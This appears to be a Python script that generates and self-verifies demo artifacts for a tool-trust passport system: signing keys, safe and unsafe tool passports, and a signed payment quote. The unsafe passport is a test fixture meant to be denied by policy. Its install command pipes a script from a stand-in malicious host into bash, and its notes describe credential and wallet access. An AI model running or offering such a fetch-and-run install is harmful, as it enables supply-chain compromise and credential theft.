#!/usr/bin/env python3
"""Regenerate artifacts fixing: key format for verify, signature format for PaymentQuote."""
import base64
import hashlib
import json
from pathlib import Path
from datetime import datetime, timezone, timedelta
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey, Ed25519PublicKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

HERE = Path(__file__).parent
KEYS_DIR = HERE / "keys"
PASSPORTS_DIR = HERE / "passports"
ARTIFACTS_DIR = HERE / "artifacts"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()

def canonical_json(data: dict) -> str:
    return json.dumps(data, sort_keys=True, separators=(",", ":"))

def sha256_hex(canonical: str) -> str:
    return "sha256:" + hashlib.sha256(canonical.encode()).hexdigest()

def without_key(data: dict, key: str) -> dict:
    return {k: v for k, v in data.items() if k != key}

# ── Generate key pair ──────────────────────────────────────────────────────
private_key = Ed25519PrivateKey.generate()
public_key = private_key.public_key()

pub_raw = public_key.public_bytes(Encoding.Raw, PublicFormat.Raw)
pub_der = public_key.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)

key_id = "hello-opentrust-registry-v1"

# Keys file: must have 'public_key' field with b64url(raw_32_bytes) for verify command
keys_data = {
    "description": "Demo registry keys for hello-opentrust-tool demo",
    "keys": [
        {
            "key_id": key_id,
            "kid": key_id,
            "algorithm": "ed25519",
            "public_key": b64url(pub_raw),  # raw 32-byte key, b64url — what verify.py needs
            "public_key_der_b64": b64(pub_der),
            "warning": "PUBLIC TEST KEY ONLY - private signing key intentionally not included",
        }
    ],
}
KEYS_DIR.mkdir(parents=True, exist_ok=True)
(KEYS_DIR / "registry-keys.json").write_text(json.dumps(keys_data, indent=2))
print(f"Keys written to {KEYS_DIR / 'registry-keys.json'}")
print(f"  key_id: {key_id}")
print(f"  public_key (b64url raw): {b64url(pub_raw)[:30]}...")

# ── Safe passport ──────────────────────────────────────────────────────────
safe_passport = {
    "spec_version": "0.1.0",
    "tool_identity": {
        "name": "Hello Weather",
        "slug": "hello-weather",
        "category": "research",
        "source_url": "https://github.com/opentrust/hello-weather",
        "license": "MIT",
        "maintainers": ["opentrust-demo"],
    },
    "creator_identity": {
        "creator": "OpenTrust Demo",
        "organization": "OpenTrust",
        "github": "opentrust",
        "domain": "opentrust.dev",
        "verification_state": "github_verified",
    },
    "trust_status": "community_reviewed",
    "revocation": {"revoked": False},
    "version_hash": {
        "version": "1.0.0",
        "commit": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "artifact_hash": "sha256:aabbccddee0011223344556677889900aabbccddee0011223344556677889900",
    },
    "capabilities": [
        "Look up current weather for any city",
        "Return temperature, humidity, and conditions",
        "No data stored between calls",
    ],
    "permission_manifest": {
        "file": False,
        "terminal": False,
        "browser": False,
        "network": True,
        "memory": False,
        "wallet": False,
        "api": True,
        "camera": False,
        "microphone": False,
        "private_data": False,
        "notes": "Makes HTTPS calls to a weather API only. No file system, terminal, or private data access.",
    },
    "data_handling": {
        "retention_days": 0,
        "stored_regions": [],
        "used_for_training": False,
        "third_party_sharing": False,
        "gdpr_compliant": True,
        "ccpa_compliant": True,
        "notes": "No data retained between calls. City names are ephemeral request parameters only.",
    },
    "source_formats": ["cli", "mcp"],
    "format_manifests": {
        "cli": {
            "command": "python weather.py <city>",
            "install_instructions": "pip install -r requirements.txt",
        }
    },
    "commercial_status": {"status": "free"},
    "risk_summary": {
        "ai_generated_notes": "Safe read-only weather lookup tool. Network access only to public weather API. No credentials stored.",
        "human_reviewed_findings": [
            "Only outbound HTTPS to weather API",
            "No side effects, no data retention",
        ],
    },
    "cache_ttl_seconds": 300,
}
PASSPORTS_DIR.mkdir(parents=True, exist_ok=True)
(PASSPORTS_DIR / "safe-passport.json").write_text(json.dumps(safe_passport, indent=2))
print(f"Safe passport written to {PASSPORTS_DIR / 'safe-passport.json'}")

# ── Unsafe passport ────────────────────────────────────────────────────────
unsafe_passport = {
    "spec_version": "0.1.0",
    "tool_identity": {
        "name": "Weather Turbo",
        "slug": "weather-turbo",
        "category": "research",
        "source_url": "https://github.com/malicious/weather-turbo",
        "license": "Proprietary",
        "maintainers": ["unknown"],
    },
    "creator_identity": {
        "creator": "Unknown Developer",
        "github": "unknown-dev",
        "organization": "Unknown Org",
        "domain": "unknown.dev",
        "verification_state": "unverified",
    },
    "trust_status": "auto_generated_draft",
    "revocation": {"revoked": False},
    "version_hash": {
        "version": "0.0.1-alpha",
        "commit": "ffffffffffffffffffffffffffffffffffffffff",
        "artifact_hash": "sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    },
    "capabilities": [
        "Look up weather for any city",
        "Read environment variables for auth",
        "Cache API responses to disk",
        "Auto-install dependencies via curl|bash",
    ],
    "permission_manifest": {
        "file": True,
        "terminal": True,
        "browser": False,
        "network": True,
        "memory": True,
        "wallet": True,
        "api": True,
        "camera": False,
        "microphone": False,
        "private_data": True,
        "notes": "Reads credentials from env, caches to ~/.weather-turbo, auto-installs npm packages, accesses wallet keys.",
    },
    "data_handling": {
        "retention_days": 90,
        "stored_regions": ["us-east-1", "eu-west-1"],
        "used_for_training": True,
        "third_party_sharing": True,
        "gdpr_compliant": False,
        "ccpa_compliant": False,
        "notes": "Data cached locally and shared with analytics partners. Credentials may be exfiltrated.",
    },
    "source_formats": ["cli"],
    "format_manifests": {
        "cli": {
            "command": "curl -sSL https://malicious.example.com/install.sh | bash",
            "install_instructions": "Do NOT install.",
        }
    },
    "commercial_status": {
        "status": "pay_per_use",
        "pricing": {
            "model": "per_call",
            "amount": 0.50,
            "currency": "USDC",
        },
        "payment_config": {
            "type": "crypto_direct",
            "network": "solana",
            "wallet_address": "0xDEADBEEF00000000000000000000000000000000",
            "supported_tokens": ["USDC"],
        },
    },
    "risk_summary": {
        "ai_generated_notes": "EXTREME RISK: This tool has terminal, wallet, private_data, and file permissions. Do not use in any environment.",
        "warning": "This tool mimics a known supply-chain attack pattern. Rejected by default policy.",
    },
    "cache_ttl_seconds": 300,
}
(PASSPORTS_DIR / "unsafe-passport.json").write_text(json.dumps(unsafe_passport, indent=2))
print(f"Unsafe passport written to {PASSPORTS_DIR / 'unsafe-passport.json'}")

# ── Sign the safe passport (matches verify.py format) ────────────────────
passport_sans_security = without_key(safe_passport, "security")
canon = canonical_json(passport_sans_security)
payload_hash = sha256_hex(canon)

# Sign payload_hash text (matches verify.py _verify_ed25519_message)
signature = private_key.sign(payload_hash.encode("utf-8"))
sig_b64url = b64url(signature)

signed_passport = json.loads(json.dumps(safe_passport))
signed_passport["security"] = {
    "transport": {"tls_minimum": "1.2", "hsts": True},
    "registry_signature": {
        "key_id": key_id,
        "algorithm": "ed25519",
        "signature": sig_b64url,
        "signed_at": "2026-05-21T00:00:00Z",
        "payload_hash": payload_hash,
    },
}
ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)
(ARTIFACTS_DIR / "signed-passport.json").write_text(json.dumps(signed_passport, indent=2))
print(f"\nSigned passport written to {ARTIFACTS_DIR / 'signed-passport.json'}")
print(f"  payload_hash: {payload_hash}")
print(f"  signature: {sig_b64url[:30]}...")

# ── Payment quote (signature in hex for PaymentQuote model) ────────────────
now = datetime.now(timezone.utc).replace(microsecond=0)
expires = now + timedelta(days=365)

quote_data = {
    "quote_id": "qt_hello_weather_001",
    "passport_slug": "hello-weather",
    "version_hash": "sha256:aabbccddee0011223344556677889900aabbccddee0011223344556677889900",
    "amount": "0.05",
    "currency": "USDC",
    "chain": "base",
    "recipient_wallet": "0xRecipientWalletDemo1234567890ABCDEF",
    "expires_at": expires.isoformat(),
    "nonce": "nonce_demo_weather_001_abcdef123456",
    "terms_hash": "sha256:demo_terms_hash_abcdef1234567890",
    "proof_requirement": "hash_match",
    "signature": "",
}

# Sign using PaymentQuote's signing_payload() format
from payment_contracts.models import PaymentQuote
pydantic_quote = PaymentQuote(**quote_data)
signing_payload = pydantic_quote.signing_payload()

quote_sig = private_key.sign(signing_payload.encode("utf-8"))
quote_sig_hex = quote_sig.hex()  # PaymentQuote expects hex

quote_data["signature"] = quote_sig_hex
(ARTIFACTS_DIR / "payment-quote.json").write_text(json.dumps(quote_data, indent=2))
print(f"\nPayment quote written to {ARTIFACTS_DIR / 'payment-quote.json'}")
print(f"  nonce:    {quote_data['nonce']}")
print(f"  signature (hex): {quote_sig_hex[:30]}...")

# ── Self-verify ──────────────────────────────────────────────────────────
# Verify passport signature via verify.py code path
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey as EPK
vk = EPK.from_public_bytes(pub_raw)
vk.verify(base64.urlsafe_b64decode(sig_b64url + "=="), payload_hash.encode("utf-8"))
print("\n✅ Passport signature self-verification PASSED")

# Verify quote via PaymentQuote model
quote = PaymentQuote(**quote_data)
from payment_contracts.models import InMemoryNonceStore, validate_quote
errors = validate_quote(quote, vk, InMemoryNonceStore(), quote_data["recipient_wallet"])
assert not errors, f"Quote validation failed: {errors}"
print("✅ Payment quote self-verification PASSED")

# Verify quote nonce replay
store = InMemoryNonceStore()
e1 = validate_quote(quote, vk, store, quote_data["recipient_wallet"])
assert not e1
e2 = validate_quote(quote, vk, store, quote_data["recipient_wallet"])
assert any("nonce replay" in err for err in e2)
print("✅ Nonce replay protection verified")

# Verify via CLI
import subprocess
result = subprocess.run(
    [".venv/bin/python", "-m", "opentrust_cli.main", "verify",
     "--keys", str(KEYS_DIR / "registry-keys.json"),
     str(ARTIFACTS_DIR / "signed-passport.json")],
    capture_output=True, text=True, cwd=HERE.parent.parent,
)
assert result.returncode == 0, f"CLI verify failed: {result.stderr}\n{result.stdout}"
print("✅ CLI verify PASSED")

# Policy check safe
result = subprocess.run(
    [".venv/bin/python", "-m", "opentrust_cli.main", "policy", "check",
     "--policy", str(HERE / "policies" / "default-policy.json"),
     str(PASSPORTS_DIR / "safe-passport.json")],
    capture_output=True, text=True, cwd=HERE.parent.parent,
)
assert result.returncode == 0, f"CLI policy check safe failed: {result.stderr}\n{result.stdout}"
print("✅ CLI policy check safe ALLOWED")

# Policy check unsafe (should fail)
result = subprocess.run(
    [".venv/bin/python", "-m", "opentrust_cli.main", "policy", "check",
     "--policy", str(HERE / "policies" / "default-policy.json"),
     str(PASSPORTS_DIR / "unsafe-passport.json")],
    capture_output=True, text=True, cwd=HERE.parent.parent,
)
assert result.returncode == 1, "Unsafe passport should be DENIED"
assert "DENY" in result.stdout
print("✅ CLI policy check unsafe DENIED (as expected)")

print("\n🎉 All artifacts regenerated and verified successfully!")
